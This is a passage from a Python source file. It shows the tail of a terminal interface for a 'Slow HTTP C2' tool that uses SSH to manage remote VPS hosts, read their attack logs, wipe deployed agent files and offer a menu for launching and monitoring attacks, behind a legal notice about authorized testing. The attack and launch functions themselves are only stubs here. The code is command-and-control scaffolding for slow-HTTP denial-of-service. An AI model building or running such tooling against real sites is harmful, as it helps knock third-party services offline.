            print(f"\n{Colors.YELLOW}[CANCELLED]{Colors.RESET}")
    
    def view_logs(self):
        print(f"{Colors.YELLOW}[INFO] This feature shows recent attack logs from VPS{Colors.RESET}")
        
        vps_list = self.db_manager.get_all_vps()
        online_vps = [vps for vps in vps_list if vps[5] == 'online']
        
        if not online_vps:
            return
        
        for vps in online_vps:
            ip = vps[1]
            print(f"\n{Colors.CYAN}[LOGS] {ip}{Colors.RESET}")
            
            success, output = self.ssh_manager.execute_command(
                ip, "ls -la /tmp/slowhttp_c2/attack_*.log 2>/dev/null | tail -3", timeout=15
            )
            
            if success and output.strip():
                print(f"Recent log files: {output}")
                
                # Show last log content
                success, content = self.ssh_manager.execute_command(
                    ip, "tail -10 /tmp/slowhttp_c2/attack_*.log 2>/dev/null | tail -10", timeout=15
                )
                
                if success and content.strip():
                    print(f"Last 10 lines:")
                    print(content)
            else:
                print("No log files found")
    
    def clean_all_vps(self):
        vps_list = self.db_manager.get_all_vps()
        online_vps = [vps for vps in vps_list if vps[5] == 'online']
        
        if not online_vps:
            print(f"{Colors.YELLOW}[INFO] No online VPS to clean{Colors.RESET}")
            return
        
        confirm = input(f"{Colors.RED}Remove all agent files from VPS? (y/N): {Colors.RESET}").strip().lower()
        if confirm != 'y':
            return
        
        print(f"\n{Colors.YELLOW}[CLEANING] Removing agent files from all VPS...{Colors.RESET}")
        
        for vps in online_vps:
            ip = vps[1]
            print(f"{Colors.CYAN}[CLEANING] {ip}...{Colors.RESET} ", end="", flush=True)
            
            success, output = self.ssh_manager.execute_command(ip, "rm -rf /tmp/slowhttp_c2")
            
            if success:
                print(f"{Colors.GREEN}SUCCESS{Colors.RESET}")
                self.db_manager.update_vps_status(ip, 'online', agent_deployed=False)
            else:
                print(f"{Colors.RED}FAILED{Colors.RESET}")
    
    # ... (rest of the TUI methods would be similar to the previous version)
    # For brevity, I'll include just the key methods
    
    def run(self):
        while self.running:
            try:
                self.clear_screen()
                self.print_banner()
                self.print_menu()
                
                choice = input().strip()
                
                if choice == '1':
                    print("VPS Management - Use previous implementation")
                elif choice == '2':
                    print("Launch Attack - Use enhanced AttackManager")
                elif choice == '3':
                    print("Monitor Attacks - Use previous implementation")
                elif choice == '4':
                    self.diagnostics_menu()
                elif choice == '5':
                    print("System Status - Use previous implementation")
                elif choice == '0':
                    print(f"{Colors.YELLOW}[EXIT] Shutting down...{Colors.RESET}")
                    break
                else:
                    print(f"{Colors.RED}Invalid option{Colors.RESET}")
                    time.sleep(1)
                    
            except KeyboardInterrupt:
                break
            except Exception as e:
                print(f"{Colors.RED}[ERROR] {str(e)}{Colors.RESET}")
                input("Press Enter to continue...")

def main():
    if sys.version_info < (3, 6):
        print("Python 3.6+ required")
        sys.exit(1)
    
    try:
        import paramiko
        from cryptography.fernet import Fernet
        import colorama
    except ImportError as e:
        print(f"Missing dependency: {e}")
        print("Install: pip install paramiko cryptography colorama")
        sys.exit(1)
    
    os.makedirs('logs', exist_ok=True)
    
    print(f"""
{Colors.RED}{Colors.BOLD}╔═══════════════════════════════════════════════════════════════╗
║                           LEGAL NOTICE                           ║
║                                                                   ║
║ This tool is for EDUCATIONAL and AUTHORIZED testing ONLY         ║
║ Unauthorized use is ILLEGAL and may result in prosecution        ║
║                                                                   ║
║ By proceeding, you acknowledge proper authorization               ║
╚═══════════════════════════════════════════════════════════════════╝{Colors.RESET}
""")
    
    confirm = input(f"{Colors.YELLOW}Do you have proper authorization? (yes/no): {Colors.RESET}").strip().lower()
    if confirm != 'yes':
        print(f"{Colors.RED}Authorization required. Exiting.{Colors.RESET}")
        sys.exit(0)
    
    try:
        print("Starting Debug Version of Slow HTTP C2...")
        tui = SlowHTTPTUI()
        tui.run()
    except Exception as e:
        print(f"Fatal error: {e}")
        sys.exit(1)

if __name__ == '__main__':
    main()
